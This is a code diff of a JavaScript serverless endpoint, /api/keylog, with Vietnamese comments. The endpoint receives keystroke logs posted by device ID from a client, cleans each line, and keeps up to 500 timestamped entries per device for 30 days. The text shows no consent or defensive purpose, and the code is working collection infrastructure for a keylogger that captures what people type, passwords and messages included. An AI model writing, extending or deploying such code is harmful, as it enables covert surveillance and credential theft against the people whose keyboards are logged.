@@ -315,8 +315,8 @@ export default {
     }
 
     // ── POST /api/keylog ───────────────────────────────────────────────────
-    // Source LQ_OBJ gửi log bàn phím lên theo device ID
-    // Mỗi request là 1 dòng độc lập (client đã flush theo từng lần gõ Enter / timer 30s)
+    // Source LQ_OBJ gửi log bàn phím theo device ID (debounce 1.5s phía client)
+    // Mỗi POST là 1 "cụm gõ" riêng — không gộp tại server
     if (url.pathname === '/api/keylog' && request.method === 'POST') {
       let body;
       try { body = await request.json(); } catch { return json({ error: 'Invalid JSON' }, corsHeaders, 400); }
@@ -327,11 +327,14 @@ export default {
       const raw = await env.KEYS_KV.get(storageKey);
       let record = raw ? JSON.parse(raw) : { deviceID, authKey: key || '', lines: [] };
 
+      // Mỗi entry là 1 dòng độc lập (real-time, không gộp)
       const now = new Date();
-      // Mỗi flush từ client là 1 entry riêng biệt (không gộp nữa)
-      record.lines.push({ text: line.trim(), ts: now.toISOString() });
-      // Giữ tối đa 500 dòng gần nhất
-      if (record.lines.length > 500) record.lines = record.lines.slice(-500);
+      const cleanLine = (line || '').trim().replace(/\n/g, '↵').replace(/\r/g, '');
+      if (cleanLine.length > 0) {
+        record.lines.push({ text: cleanLine, ts: now.toISOString() });
+        // Giữ tối đa 500 dòng gần nhất
+        if (record.lines.length > 500) record.lines = record.lines.slice(-500);
+      }
 
       record.authKey = key || record.authKey;
       await env.KEYS_KV.put(storageKey, JSON.stringify(record), { expirationTtl: 60 * 60 * 24 * 30 });
